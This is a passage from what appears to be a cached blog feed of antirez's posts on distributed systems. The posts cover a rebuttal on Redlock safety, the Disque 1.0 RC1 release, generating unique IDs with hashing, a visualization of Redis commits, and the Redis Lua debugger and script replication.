<br>
<br>Another approach when there are many clients and no node mediating the access is to use randomized and exponential delays to contact the nodes again, if a round of the algorithm failed.
<br>
<br>## Why fsync is needed?
<br>
<br>Here fsync at every write is mandatory because if nodes go down and restart, they MUST have the latest value of the “current” key. If the value of current returns backward, it is possible to violate our safety property that states that the newly generated IDs are always greater than any other ID generated in the past. However if you use a full replicated FSM to achieve the same goal, you need fsync anyway (but you don’t have the problem of the concurrent accesses. For example using Raft in normal conditions you have a single leader you can send requests to).
<br>
<br>So, in the case of Redis, it must be configured with AOF enabled and the AOF fsync policy set to always, to make sure the write is always persisted before to reply to the client.
<br>
<br>## What do I do with those IDs
<br>
<br>A set of IDs like that, have a property which is called “total ordering”, so they are very useful in different contexts. Usually it is hard with distributed computations to say what happened before and what happened after. Using those IDs you always know the order of certain events.
<br>
<br>To give you a simple example: different processes, using this system, may compute a list of items, and take each sub-list in their local storage. At the end, they could merge the multiple lists and get a final list in the right order, as if there was a single shared list since the start where each process was able to append an item.
<br>
<br>## Origins of this algorithm
<br>
<br>What described here closely resembles both Paxos first phase and Raft leader election. However it seems just a special case of Lamport timestamp where the majority is used in order to create total ordering.
<br>
<br>Many thanks to Max Neunhoeffer and Martin Kleppmann for feedbacks about the initial draft of this blog post. Note that any error is mine.
<a href=\"http://antirez.com/news/102\">Comments</a>" nil "http://antirez.com/news/102" "e3ea7d3a150155725dafe5e2d78c6fdb") (54 (26588 31767 62109 131000) "http://antirez.com/news/101
" "Is Redlock safe? " nil "Tue, 09 Feb 2016 15:33:51 +0000" "Martin Kleppmann, a distributed systems researcher, yesterday published an analysis of Redlock (http://redis.io/topics/distlock), that you can find here: http://martin.kleppmann.com/2016/02/08/how-to-do-distributed-locking.html
<br>
<br>Redlock is a client side distributed locking algorithm I designed to be used with Redis, but the algorithm orchestrates, client side, a set of nodes that implement a data store with certain capabilities, in order to create a multi-master fault tolerant, and hopefully safe, distributed lock with auto release capabilities.
<br>You can implement Redlock using MySQL instead of Redis, for example.
<br>
<br>The algorithm's goal was to move away people that were using a single Redis instance, or a master-slave setup with failover, in order to implement distributed locks, to something much more reliable and safe, but having a very low complexity and good performance.
<br>
<br>Since I published Redlock people implemented it in multiple languages and used it for different purposes.
<br>
<br>Martin's analysis of the algorithm concludes that Redlock is not safe. It is great that Martin published an analysis, I asked for an analysis in the original Redlock specification here: http://redis.io/topics/distlock. So thank you Martin. However I don’t agree with the analysis. The good thing is that distributed systems are, unlike other fields of programming, pretty mathematically exact, or they are not, so a given set of properties can be guaranteed by an algorithm or the algorithm may fail to guarantee them under certain assumptions. In this analysis I’ll analyze Martin's analysis so that other experts in the field can check the two documents (the analysis and the counter-analysis), and eventually we can understand if Redlock can be considered safe or not.
<br>
<br>Why Martin thinks Redlock is unsafe
<br>-----------------------------------
<br>
<br>The arguments in the analysis are mainly two:
<br>
<br>1. Distributed locks with an auto-release feature (the mutually exclusive lock property is only valid for a fixed amount of time after the lock is acquired) require a way to avoid issues when clients use a lock after the expire time, violating the mutual exclusion while accessing a shared resource. Martin says that Redlock does not have such a mechanism.
<br>
<br>2. Martin says the algorithm is, regardless of problem “1”, inherently unsafe since it makes assumptions about the system model that cannot be guaranteed in practical systems.
<br>
<br>I’ll address the two concerns separately for clarity, starting with the first “1”.
<br>
<br>Distributed locks, auto release, and tokens
<br>-------------------------------------------
<br>
<br>A distributed lock without an auto release mechanism, where the lock owner will hold it indefinitely, is basically useless. If the client holding the lock crashes and does not recover with full state in a short amount of time, a deadlock is created where the shared resource that the distributed lock tried to protect remains forever unaccessible. This creates a liveness issue that is unacceptable in most situations, so a sane distributed lock must be able to auto release itself.
<br>
<br>So practical locks are provided to clients with a maximum time to live. After the expire time, the mutual exclusion guarantee, which is the *main* property of the lock, is gone: another client may already have the lock. What happens if two clients acquire the lock at two different times, but the first one is so slow, because of GC pauses or other scheduling issues, that will try to do work in the context of the shared resource at the same time with second client that acquired the lock?
<br>
<br>Martin says that this problem is avoided by having the distributed lock server to provide, with every lock, a token, which is, in his example, just a number that is guaranteed to always increment. The rationale for Martin's usage of a token, is that this way, when two different clients access the locked resource at the same time, we can use the token in the database write transaction (that is assumed to materialize the work the client does): only the client with the greatest lock number will be able to write to the database.
<br>
<br>In Martin's words:
<br>
<br>“The fix for this problem is actually pretty simple: you need to include a fencing token with every write request to the storage service. In this context, a fencing token is simply a number that increases (e.g. incremented by the lock service) every time a client acquires the lock”
<br>
<br>… snip …
<br>
<br>“Note this requires the storage server to take an active role in checking tokens, and rejecting any writes on which the token has gone backwards”.
<br>
<br>I think this argument has a number of issues:
<br>
<br>1. Most of the times when you need a distributed lock system that can guarantee mutual exclusivity, when this property is violated you already lost. Distributed locks are very useful exactly when we have no other control in the shared resource. In his analysis, Martin assumes that you always have some other way to avoid race conditions when the mutual exclusivity of the lock is violated. I think this is a very strange way to reason about distributed locks with strong guarantees, it is not clear why you would use a lock with strong properties at all if you can resolve races in a different way. Yet I’ll continue with the other points below just for the sake of showing that Redlock can work well in this, very artificial, context.
<br>
<br>2. If your data store can always accept the write only if your token is greater than all the past tokens, than it’s a linearizable store. If you have a linearizable store, you can just generate an incremental ID for each Redlock acquired, so this would make Redlock equivalent to another distributed lock system that provides an incremental token ID with every new lock. However in the next point I’ll show how this is not needed.
<br>
<br>3. However “2” is not a sensible choice anyway: most of the times the result of working to a shared resource is not writing to a linearizable store, so what to do? Each Redlock is associated with a large random token (which is generated in a way that collisions can be ignored. The Redlock specification assumes textually “20 bytes from /dev/urandom”). What do you do with a unique token? For example you can implement Check and Set. When starting to work with a shared resource, we set its state to “`<token>`”, then we operate the read-modify-write only if the token is still the same when we write.
<br>
<br>4. Note that in certain use cases, one could say, it’s useful anyway to have ordered tokens. While it’s hard to think at an use case, note that for the same GC pauses Martin mentions, the order in which the token was acquired, does not necessarily respects the order in which the clients will attempt to work on the shared resource, so the lock order may not be casually related to the effects of working to a shared resource.
<br>
<br>5. Most of the times, locks are used to access resources that are updated in a way that is non transactional. Sometimes we use distributed locks to move physical objects, for example. Or to interact with another external API, and so forth.
<br>
<br>I want to mention again that, what is strange about all this, is that it is assumed that you always must have a way to handle the fact that mutual exclusion is violated. Actually if you have such a system to avoid problems during race conditions, you probably don’t need a distributed lock at all, or at least you don’t need a lock with strong guarantees, but just a weak lock to avoid, most of the times, concurrent accesses for performances reasons.
<br>
<br>However even if you happen to agree with Martin about the fact the above is very useful, the bottom line is that a unique identifier for each lock can be used for the same goals, but is much more practical in terms of not requiring strong guarantees from the store.
<br>
<br>Let’s talk about system models
<br>------------------------------
<br>
<br>The above criticism is basically common to everything which is a distributed lock with auto release, not providing a monotonically increasing counter with each lock. However the other critique of Martin is specific to Redlock. Here Martin really analyzes the algorithm, concluding it is broken.
<br>
<br>Redlock assumes a semi synchronous system model where different processes can count time at more or less the same “speed”. The different processes don’t need in any way to have a bound error in the absolute time. What they need to do is just, for example, to be able to count 5 seconds with a maximum of 10% error. So one counts actual 4.5 seconds, another 5.5 seconds, and we are fine.
<br>
<br>Martin also states that Redlock requires bound messages maximum delays, which is not correct as far as I can tell (I’ll explain later what’s the problem with his reasoning).
<br>
<br>So let’s start with the issue of different processes being unable to count time at the same rate.
<br>
<br>Martin says that the clock can randomly jump in a system because of two issues:
<br>
<br>1. The system administrator manually alters the clock.
<br>
<br>2. The ntpd daemon changes the clock a lot because it receives an update.
<br>
<br>The above two problems can be avoided by “1” not doing this (otherwise even corrupting a Raft log with “echo foo > /my/raft/log.bin” is a problem), and “2” using an ntpd that does not change the time by jumping directly, but by distributing the change over the course of a larger time span.
<br>
<br>However I think Martin is right that Redis and Redlock implementations should switch to the monotonic time API provided by most operating systems in order to make the above issues less of a problem. This was proposed several times in the past, adds a bit of complexity inside Redis, but is a good idea: I’ll implement this in the next weeks. However while we’ll switch to monotonic time API, because there are advantages, processes running in an operating system without a software (time server) or human (system administrator) elements altering the clock, *can* count relative time with a bound error even with gettimeofday().
<br>
<br>Note that there are past attempts to implement distributed systems even assuming a bound absolute time error (by using GPS units). Redlock does not require anything like that, just the ability of different processes to count 10 seconds as 9.5 or 11.2 (+/- 2 seconds max in the example), for instance.
<br>
<br>So is Redlock safe or not? It depends on the above. Let’s assume we use the monotonically increasing time API, for the sake of simplicity to rule out implementation details (system administrators with a love for POKE and time servers). Can a process count relative time with a fixed percentage of maximum error? I think this is a sounding YES, and is simpler to reply yes to this than to: “can a process write a log without corrupting it”?
<br>
<br>Network delays & co
<br>-------------------
<br>
<br>Martin says that Redlock does not just depend on the fact that processes can count time at approximately the same time, he says:
<br>
<br>“However, Redlock is not like this. Its safety depends on a lot of timing assumptions: it assumes that all Redis nodes hold keys for approximately the right length of time before expiring; that that the network delay is small compared to the expiry duration; and that process pauses are much shorter than the expiry duration.”
<br>
<br>So let’s split the above claims into different parts:
<br>
<br>1. Redis nodes hold keys for approximately the right length of time.
<br>
<br>2. Network delays are small compared to the expiry duration.
<br>
<br>3. Process pauses are much shorter than the expiry duration.
<br>
<br>All the time Martin says that “the system clock jumps” I assume that we covered this by not poking with the system time in a way that is a problem for the algorithm, or for the sake of simplicity by using the monotonic time API. So:
<br>
<br>About claim 1: This is not an issue, we assumed that we can count time approximately at the same speed, unless there is any actual argument against it.
<br>
<br>About claim 2: Things are a bit more complex. Martin says:
<br>
<br>“Okay, so maybe you think that a clock jump is unrealistic, because you’re very confident in having correctly configured NTP to only ever slew the clock.” (Yep we agree here ;-) he continues and says…)
<br>
<br>“In that case, let’s look at an example of how a process pause may cause the algorithm to fail:
<br>Client 1 requests lock on nodes A, B, C, D, E.
<br>While the responses to client 1 are in flight, client 1 goes into stop-the-world GC.
<br>Locks expire on all Redis nodes.
<br>Client 2 acquires lock on nodes A, B, C, D, E.
<br>Client 1 finishes GC, and receives the responses from Redis nodes indicating that it successfully acquired the lock (they were held in client 1’s kernel network buffers while the process was paused).
<br>Clients 1 and 2 now both believe they hold the lock.”
<br>
<br>If you read the Redlock specification, that I hadn't touched for months, you can see the steps to acquire the lock are:
<br>
<br>1. Get the current time.
<br>
<br>2. … All the steps needed to acquire the lock …
<br>
<br>3. Get the current time, again.
<br>
<br>4. Check if we are already out of time, or if we acquired the lock fast enough.
<br>
<br>5. Do some work with your lock.
<br>
<br>Note steps 1 and 3. Whatever delay happens in the network or in the processes involved, after acquiring the majority we *check again* that we are not out of time. The delay can only happen after steps 3, resulting into the lock to be considered ok while actually expired, that is, we are back at the first problem Martin identified of distributed locks where the client fails to stop working to the shared resource before the lock validity expires. Let me tell again how this problem is common with *all the distributed locks implementations*, and how the token as a solution is both unrealistic and can be used with Redlock as well.
<br>
<br>Note that whatever happens between 1 and 3, you can add the network delays you want, the lock will always be considered not valid if too much time elapsed, so Redlock looks completely immune from messages that have unbound delays between processes. It was designed with this goal in mind, and I cannot see how the above race condition could happen.
<br>
<br>Yet Martin's blog post was also reviewed by multiple DS experts, so I’m not sure if I’m missing something here or simply the way Redlock works was overlooked simultaneously by many. I’ll be happy to receive some clarification about this.
<br>
<br>The above also addresses “process pauses” concern number 3. Pauses during the process of acquiring the lock don’t have effects on the algorithm's correctness. They can however, affect the ability of a client to make work within the specified lock time to live, as with any other distributed lock with auto release, as already covered above.
<br>
<br>Digression about network delays
<br>---
<br>
<br>Just a quick note. In server-side implementations of a distributed lock with auto-release, the client may ask to acquire a lock, the server may allow the client to do so, but the process can stop into a GC pause or the network may be slow or whatever, so the client may receive the \"OK, the lock is your\" too late, when the lock is already expired. However you can do a lot to avoid your process sleeping for a long time, and you can't do much to avoid network delays, so the steps to check the time before/after the lock is acquired, to see how much time is left, should actually be common practice even when using other systems implementing locks with an expiry.
<br>
<br>Fsync or not?
<br>-------------
<br>
<br>At some point Martin talks about the fact that Redlock uses delayed restarts of nodes. This requires, again, the ability to be able to wait more or less a specified amount of time, as covered above. Useless to repeat the same things again.
<br>
<br>However what is important about this is that, this step is optional. You could configure each Redis node to fsync at every operation, so that when the client receives the reply, it knows the lock was already persisted on disk. This is how most other systems providing strong guarantees work. The very interesting thing about Redlock is that you can opt-out any disk involvement at all by implementing delayed restarts. This means it’s possible to process hundreds of thousands locks per second with a few Redis instances, which is something impossible to obtain with other systems.
<br>
<br>GPS units versus the local computer clock
<br>-----------------------------------------
<br>
<br>Returning to the system model, one thing that makes Redlock system model practical is that you can assume a process to never be partitioned with the system clock. Note that this is different compared to other semi synchronous models where GPS units are used, because there are two non obvious partitions that may happen in this case:
<br>
<br>1. The GPS is partitioned away from the GPS network, so it can’t acquire a fix.
<br>
<br>2. The process and the GPS are not able to exchange messages or there are delays in the messages exchanged.
<br>
<br>The above problems may result into a liveness or safety violation depending on how the system is orchestrated (safety issues only happen if there is a design error, for example if the GPS updates the system time asynchronously so that, when the GPS does not work, the absolute time error may go over the maximum bound).
<br>
<br>The Redlock system model does not have these complexities nor requires additional hardware, just the computer clock, and even a very cheap clock with all the obvious biases due to the crystal temperature and other things influencing the precision.
<br>
<br>Conclusions
<br>-----------
<br>
<br>I think Martin has a point about the monotonic API, Redis and Redlock implementations should use it to avoid issues due to the system clock being altered. However I can’t identify other points of the analysis affecting Redlock safety, as explained above, nor do I find his final conclusions that people should not use Redlock when the mutual exclusion guarantee is needed, justified.
<br>
<br>It would be great to both receive more feedbacks from experts and to test the algorithm with Jepsen, or similar tools, to accumulate more data.
<br>
<br>A big thank you to the friends of mine that helped me to review this post.
<a href=\"http://antirez.com/news/101\">Comments</a>" nil "http://antirez.com/news/101" "1f2e0728893a8fffa4a510f7971a3bdf") (53 (26588 31767 61271 498000) "http://antirez.com/news/100
" "Disque 1.0 RC1 is out! " nil "Sat, 02 Jan 2016 15:26:07 +0000" "Today I’m happy to announce that the first release candidate for Disque 1.0 is available.
<br>
<br>If you don't know what Disque is, the best starting point is to read the README in the Github project page at http://github.com/antirez/disque.
<br>
<br>Disque is a just piece of software, so it has a material value which can be zero or more, depending on its ability to make useful things for people using it. But for me there is an huge value that goes over what Disque, materially, is. It is the value of designing and doing something you care about. It’s the magic of programming: where there was nothing, now there is something that works, that other people may potentially analyze, run, use.
<br>
<br>Distributed systems are a beautiful field. Thanks to Redis, and to the people that tried to mentor me in a way or the other, I got exposed to distributed systems. I wanted to translate this love to something tangible. A new, small system, designed from scratch, without prejudices and without looking too closely to what other similar systems were doing. The experience with Redis shown me that message brokers were a very interesting topic, and that in some way, they are the perfect topic to apply DS concepts. I even pretend message brokers can be fun and exciting. So I tried to design a new message queue, and Disque is the result.
<br>
<br>Disque design goal is to provide a system with a good user experience: to provide certain guarantees in the context of messaging, guarantees which are easy to reason about, and to provide extreme operational simplicity. The RC1 offers the foundation, but there is more work to do. For once I hope that Disque will be tested by Aphyr with Jepsen in depth. Since Disque is a system that provides certain kinds of guarantees that can be tested, if it fails certain tests, this translates directly to some bug to fix, that means to end with a better system.
<br>
<br>On the operational side there is to test it in the real world. AP and message queues IMHO are a perfect match to provide operational robustness. However I’m not living into the illusion that I got everything right in the first release, so it will take months (or years?) of iteration to *really* reach the operational simplicity I’m targeting. Moreover this is an RC1 that was heavily modified in the latest weeks, I expect it to have a non trivial amount of bugs.
<br>
<br>From the point of view of making a fun and exciting system, I tried to end with a simple and small API that does not force the user to think at the details of *this specific* implementation, but more generally at the messaging problem she or he got. Disque also has a set of introspection capabilities that should help making it a non-opaque system that is actually possible to debug and observe.
<br>
<br>Even with all the limits of new code and ideas, the RC release is a great first step, and I’m glad Disque is not in the list of side projects that we programmers start and never complete.
<br>
<br>I was not alone during the past months, while hacking with Disque and trying to figure out how to shape it, I received the help of: He Sun, Damian Janowski, Josiah Carlson, Michel Martens, Jacques Chester, Kyle Kingsbury, Mark Paluch, Philipp Krenn, Justin Case, Nathan Fritz, Marcos Nils, Jasper Louis Andersen, Vojtech Vitek, Renato C., Sebastian Waisbrot, Redis Labs and Pivotal, and probably more people I’m not remembering right now. Thank you for your help.
<br>
<br>The RC1 is tagged in the Disque Github repository. Have fun!
<a href=\"http://antirez.com/news/100\">Comments</a>" nil "http://antirez.com/news/100" "75a699f1175e828b223988f40490deba") (52 (26588 31767 61041 483000) "http://antirez.com/news/99
" "Generating unique IDs: an easy and reliable way " nil "Sat, 21 Nov 2015 14:47:01 +0000" "Two days ago Mike Malone published an interesting post on Medium about the V8 implementation of Math.random(), and how weak is the quality of the PRNG used: http://bit.ly/1SPDraN.
<br>
<br>The post was one of the top news on Hacker News today. It’s pretty clear and informative from the point of view of how Math.random() is broken and how should be fixed, so I’ve nothing to add to the matter itself. But since the author discovered the weakness of the PRNG in the context of generating large probably-non-colliding IDs, I want to share with you an alternative that I used multiple times in the past, which is fast and extremely reliable.
<br>
<br>The problem of unique IDs
<br>- - -
<br>
<br>So, in theory, if you want to generate unique IDs you need to store some state that makes sure an ID is never repeated. In the trivial case you may use just a simple counter. However the previous ID generated must be stored in a consistent way. In case of restart of the system, it should never happen that the same ID is generated again because our stored counter was not correctly persisted on disk.
<br>
<br>If we want to generate unique IDs using multiple processes, each process needs to make sure to prepend its IDs with some process-specific prefix that will never collide with another process prefix. This can be complex to manage as well. The simple fact of having to store in a reliable way the old ID is very time consuming when we want to generate an high number of IDs per second.
<br>
<br>Fortunately there is a simple solution. Generate a random number in a range between 0 and N, with N so big that the probability of collisions is so small to be, for every practical application, irrelevant.
<br>This works if the number we generate is uniformly distributed between 0 and N. If this prerequisite is true we can use the birthday paradox in order to calculate the probability of collisions.
<br>
<br>By using enough bits it’s trivial to make the probability of a collision billions of times less likely than an asteroid centering the Earth, even if we generate millions of IDs per second for hundreds of years.
<br>If this is not enough margin for you, just add more bits, you can easily reach an ID space larger than the number of atoms in the universe.
<br>
<br>This generation method has a great advantage: it is completely stateless. Multiple nodes can generate IDs at the same time without exchanging messages. Moreover there is nothing to store on disk so we can go as fast as our CPU can go. The computation will easily fit the CPU cache. So it’s terribly fast and convenient.
<br>
<br>Mike Malone was using this idea, by using the PRNG in order to create an ID composed of a set of characters, where each character was one of 64 possible characters. In order to create each character the weak V8 PRNG was used, resulting into collisions. Remember that our initial assumption is that each new ID must be selected uniformly in the space between 0 and N.
<br>
<br>You can fix this problem by using a stronger PRNG, but this requires an analysis of the PRNG. Another problem is seeding, how do you start the process again after a restart in order to make sure you don’t pick the initial state of the PRNG again? Otherwise your real ID space is limited by the seeding of the PRNG, not the output space itself.
<br>
<br>For all the above reasons I want to show you a trivial technique that avoids most of these problems.
<br>
<br>Using a crypto hash function to generate unique IDs
<br>- - -
<br>
<br>Cryptographic hash functions are non invertible functions that transform a sequence of bits into a fixed sequence of bits. They are designed in order to resist a variety of attacks, however in this application we only rely on a given characteristic they have: uniformity of output. Changing a bit in the input of the hash function will result in each bit of the output to change with a 50% probability.
<br>
<br>In order to have a reliable seed, we use some help from the operating system, by querying /dev/urandom. Seeding the generator is a moment where we really want some external entropy, otherwise we really risk of doing some huge mistake and generating the same sequence again.
<br>
<br>As an example of crypto hash function we'll use the well known SHA1, that has an output of 160 bits. Note that you could use even MD5 sum for this application: the vulnerabilities it has have no impact in our usage here.
<br>
<br>We start creating a seed, by reading 160 bits from /dev/urandom. In pseudocode it will be something like:
<br>
<br>    seed = devurandom.read(160/8)
<br>
<br>We also initialize a counter:
<br>
<br>    counter = 0
<br>
<br>Now this is the function that will generate every new ID:
<br>
<br>    function get_new_id()
<br>        myid = SHA1(string(counter) + seed)
<br>        counter = counter + 1
<br>        return myid
<br>    end
<br>
<br>Basically we have a fixed string, which is our seed, and we hash it with a progressive counter, so if our seed is “foo”, we output new IDs as:
<br>
<br>    SHA1(“0foo”)
<br>    SHA1(“1foo”)
<br>    SHA1(“2foo”)
<br>
<br>This is already good for our use case. However we may also need that our IDs are not easy to predict. In order to make the IDs very hard to predict instead of using SHA1 in the get_new_id() function, just use SHA1_HMAC() instead, where the seed is the secret, and the counter the message of the HMAC.
<br>
<br>This method is fast, has guaranteed good distribution, so collisions will be as hard as predicted by the birthday paradox, there is no analysis needed on the PRNG, and is completely stateless.
<br>
<br>I use it on my Disque project in order to generate message IDs among multiple nodes in a distributed system.
<br>
<br>Hacker News thread here: https://news.ycombinator.com/item?id=10606910
<a href=\"http://antirez.com/news/99\">Comments</a>" nil "http://antirez.com/news/99" "04e0ca2c8babec4ef9a3d794059c37df") (51 (26588 31767 60719 828000) "http://antirez.com/news/98
" "6 years of commit visualized " nil "Fri, 20 Nov 2015 10:58:34 +0000" "Today I was curious about plotting all the Redis commits we have on Git, which are 90% of all the Redis commits. There was just an initial period where I used SVN but switched very soon.
<br>
<br>Full size image here: http://antirez.com/misc/commitsvis.png
<br>
<br>!~!<img src=\"http://antirez.com/misc/commitsvis.png\" width=\"777\" height=\"284\">
<br>
<br>Each commit is a rectangle. The height is the number of affected lines (a logarithmic scale is used). The gray labels show release tags.
<br>
<br>There are little surprises since the amount of commit remained pretty much the same over the time, however now that we no longer backport features back into 3.0 and future releases, the rate at which new patchlevel versions are released diminished.
<br>
<br>Major releases look more or less evenly spaced between 2.6, 2.8 and 3.0, but were more frequent initially, something that should change soon as we are trying to switch to time-driven releases with 3 new major release each year (that obviously will contain less new things compared to the amount of stuff was present in major releases that took one whole year).
<br>For example 3.2 RC is due for December 2015.
<br>
<br>Patch releases of a given major release tend to have a logarithmic curve shape. As a release mature, in general it gets less critical bugs. Also attention shifts progressively to the new release.
<br>
<br>I would love Github to give us stuff like that and much more. There is a lot of data in commits of a project that is there for years. This data should be analyzed and explored... it's a shame that the graphics section is apparently the same thing for years.
<br>
<br>EDIT: The Tcl script used to generate this graph is here: https://github.com/antirez/redis/tree/unstable/utils/graphs/commits-over-time
<a href=\"http://antirez.com/news/98\">Comments</a>" nil "http://antirez.com/news/98" "4996e08b1cd9ced9838c812ba6a18753") (50 (26588 31767 60547 393000) "http://antirez.com/news/97
" "Recent improvements to Redis Lua scripting " nil "Thu, 19 Nov 2015 11:23:27 +0000" "Lua scripting is probably the most successful Redis feature, among the ones introduced when Redis was already pretty popular: no surprise that a few of the things users really want are about scripting. The following two features were suggested multiple times over the last two years, and many people tried to focus my attention into one or the other during the Redis developers meeting, a few weeks ago.
<br>
<br>1. A proper debugger for Redis Lua scripts.
<br>2. Replication, and storage on the AOF, of Lua scripts as a set of write commands materializing the *effects* of the script, instead of replicating the script itself as we normally do.
<br>
<br>The second feature is not just a matter of how scripts are replicated, but also touches what you can do with Lua scripting as we will see later.
<br>
<br>Back from London, I implemented both the features. This blog post describes both, giving a few hints about the design and implementation aspects that may be interesting for the readers.
<br>
<br>A proper Lua debugger
<br>---
<br>
<br>Lua scripting was initially conceived in order to write really trivial scripts. Things like: if the key exists do this. A couple of lines in order to avoid bloating Redis with all the possible variations of commands. Of course users did a lot more with it, and started to write complex scripts: from quad-tree implementations to full featured messaging systems with non trivial semantics. Lua scripting makes Redis programmable, and usually programmers can’t resist to programmable things. It helps that all the Lua scripts run using the same interpreter and are cached, so they are very fast. It is most of the time possible to do a lot more with a Redis instance by using Lua scripting, both functionally and in terms of operations per second. So complex scripts totally have their place today. We went from a very cold reception of the scripting feature (something as dynamic as a script sent to a database!), to mass usage, to writing complex scripts in a matter of a few years.
<br>
<br>However writing simple scripts and writing complex scripts is a completely different matter. Bigger programs become exponentially more complex, and you can feel this even when going from 10 to 200 lines of code. While you can debug by brute force any simple script, just trying a few variants and observing the effects on the data set, or putting a few logging instructions in the middle, with complex scripts you have a bad time without a debugger.
<br>
<br>My colleague Itamar Haber used a lot of his time to write complex scripts recently. At some point he also wrote some kind of debugger for Redis Lua scripting using the Lua debug library. This debugger no longer works since the debug library is now no longer exposed to scripts, for sandboxing concerns, and in general, what you want in a Redis debugger is an interactive and remote debugger, with a proper client able to work alongside with the server, to provide a good debugging experience. Debugging is already a lot of hard work, to have solid tools is really a must. The only way to accomplish this result, was to add proper debugging support inside Redis itself.
<br>
<br>So back from London Itamar and I started to talk about what a debugger should export to the user in order to be kinda of useful, and a real upgrade compared to the past. It was also discussed to just add support for the Lua debuggers that already exist outside the Redis ecosystem. However I strongly believe the user experience is enhanced when everything is designed specifically to work well with Redis, so in the end I decided to wrote the debugger from scratch. A few things were sure: we needed a remote debugger where you could attach to Redis, start a debugging session, have good observability of what the script was doing with the Redis dataset. A special concern of mine was to have colorized output, of course ;-) I wanted to make debugging a fun experience, and to have a very fast learning curve, which are related.
<br>
<br>Now to show how a debugger work, by writing a blog post about it, is surely possible but, even a purist like me writing articles in courier, will resort to a video from time to time. So here is longish video showing the main features of the Redis debugger. I start talking like a bit depressed since this was early in the morning, but after a few minutes coffee fires in and you’ll se me more happy.
<br>
<br>(Hint: watch the video in full screen to have acceptable font size for the interactive session. Video is high quality enough to make them readable)
<br>
<br>!~!<iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/IMvRfStaoyM\" frameborder=\"0\" allowfullscreen></iframe>
<br>
<br>If you are not into playing videos, a short recap of what you can do with the Lua debugger is provided by the debugger help screen itself:
<br>
<br>$ ./redis-cli --ldb --eval /tmp/script.lua
<br>Lua debugging session started, please use:
<br>quit    -- End the session.
<br>restart -- Restart the script in debug mode again.
<br>help    -- Show Lua script debugging commands.
<br>
<br>* Stopped at 1, stop reason = step over
<br>-> 1   local src = KEYS[1]
<br>lua debugger> help
<br>Redis Lua debugger help:
<br>[h]elp               Show this help.
<br>[s]tep               Run current line and stop again.
<br>[n]ext               Alias for step.
<br>[c]continue          Run till next breakpoint.
<br>[l]list              List source code around current line.
<br>[l]list [line]       List source code around [line].
<br>                     line = 0 means: current position.
<br>[l]list [line] [ctx] In this form [ctx] specifies how many lines
<br>                     to show before/after [line].
<br>[w]hole              List all source code. Alias for 'list 1 1000000'.
<br>[p]rint              Show all the local variables.
<br>[p]rint <var>        Show the value of the specified variable.
<br>                     Can also show global vars KEYS and ARGV.
<br>[b]reak              Show all breakpoints.
<br>[b]reak <line>       Add a breakpoint to the specified line.
<br>[b]reak -<line>      Remove breakpoint from the specified line.
<br>[b]reak 0            Remove all breakpoints.
<br>[t]race              Show a backtrace.
<br>[e]eval <code>       Execute some Lua code (in a different callframe).
<br>[r]edis <cmd>        Execute a Redis command.
<br>[m]axlen [len]       Trim logged Redis replies and Lua var dumps to len.
<br>                     Specifying zero as <len> means unlimited.
<br>[a]abort             Stop the execution of the script. In sync
<br>                     mode dataset changes will be retained.
<br>
<br>Debugger functions you can call from Lua scripts:
<br>redis.debug()        Produce logs in the debugger console.
<br>redis.breakpoint()   Stop execution like if there was a breakpoing.
<br>                     in the next line of code.
<br>lua debugger>
<br>
<br>How it works?
<br>---
<br>
<br>The whole debugger is pretty much a self contained block of code, and consists of 1300 lines of code, mostly inside scripting.c, but a few inside redis-cli.c, in order to implement the CLI special mode acting as a client for the debugger. As already said this is a server-client remote debugger.
<br>
<br>The Lua C API has a debugging interface that’s pretty useful. Is not a debugger per-se, but offers the primitives you need in order to write a debugger. However writing a debugger in the context of Redis was a bit less trivial that writing a Lua stand-alone debugger. In order to debug the script you have callbacks executed while the script is running. But when Redis is running a script, we are in the context of EVAL, executing a client command. How to do I/O there if we are blocked? Also what happens to the Redis server? Even if debugging must be performed in a development server and not into a production server, to completely hang the instance may not be a good idea. Maybe other developers want to use the instance, or the single developer that is debugging the script wants to create a new parallel debugging session. And finally, what about rolling back the changes so that the same script can be tested again and again with the same Redis data set, regardless of the changes it does while we are debugging? Determinism is gold in the context of debugging.
<br>
<br>So I needed a complex implementation, apparently. Or I needed to cheat big time, and find a strange solution to the problem involving a lot less code and complexity, but giving 90% of the benefits I was looking for. This odd solution turned out to be the following:
<br>
<br>* When a debugging session starts, fork() Redis.
<br>* Capture the client file descriptor, and do direct, blocking I/O while the debugging session is active.
<br>* Use the Redis protocol, but a trivial subset that can be implemented in a couple of lines of code, so that we don’t re-enter the Redis event loop at all. The I/O is part of the debugger.
<br>
<br>After 400 lines of code I had all the basic working, so the rest was just a matter of adding features and fixing bugs and corner cases.
<br>
<br>This gives us everything we needed: the server is not blocked since each debugging session is a separated process. We don’t need to re-enter the event loop from within the middle of an EVAL call, and we have rollback for free.
<br>
<br>However, there is also a synchronous mode available, that blocks the server, in the case you really need to debug something while preserving the changes to the dataset. I’ve the feeling this will not be used much at all but to add this mode was a matter of not forking and handling the cleanup of the client at the end, so I added this mode as well.
<br>
<br>On top of that it was possible to add everything else using a Lua “line” hook in order to implement stepping and breakpoints. Since the debugger is integrated inside Redis itself, it was trivial to capture all the Redis calls to show the user what was happening. The I/O model is also trivial, we just read input from the user and output appending to a buffer. Every time the debugger stops at some point, the output is flushed to the client as an array of “status replies”. The prefix of each line hints redis-cli about the colorization to provide.
<br>
<br>Because of this design, the debugger was working after 2 days and was complete after 4 days of work. Moreover this design allowed me to write completely self contained code, so the debugger interacts almost zero with the rest of Redis. This will make possible to release it with Redis 3.2 in December.
<br>
<br>A simple way to make the debugger much more powerful almost for free was to
<br>add two new Redis Lua calls: redis.breakpoint() and redis.debug(), that
<br>respectively can simulate a breakpoint inside the debugger (to the next line
<br>to be executed), or log Lua objects in the debugger console. This way you can
<br>add breakpoints that only fire when something interesting happens:
<br>
<br>    if some_odd_condition then redis.breakpoint() end
<br>
<br>This effectively replaces a lot of complex features you may add into a debugger.
<br>However we also have all the normal features directly inside the debugger,
<br>like static breakpoints, the ability to observe the state, and so forth.
<br>
<br>I’m very interested in what users writing complex scripts will think about it!
<br>We’ll see.
<br>
<br>Script effects replication
<br>---
<br>
<br>Before understanding why replicating just the *effects* of a script is interesting, it’s better to understand why instead by default replicating the script itself, to be re-executed by slaves, was considered the best option and is anyway the default. The central matter is: bandwidth between the master and the salve, and in general the ability of the slave to “follow” the master (keep in sync without too much delay) and don’t lag behind.
<br>
<br>Think at this small Redis Lua script:
<br>
<br>    local i;
<br>    for i=0,1000000 do
<br>        redis.call(“lpush”,KEYS[1],ARGV[1])
<br>    end
<br>
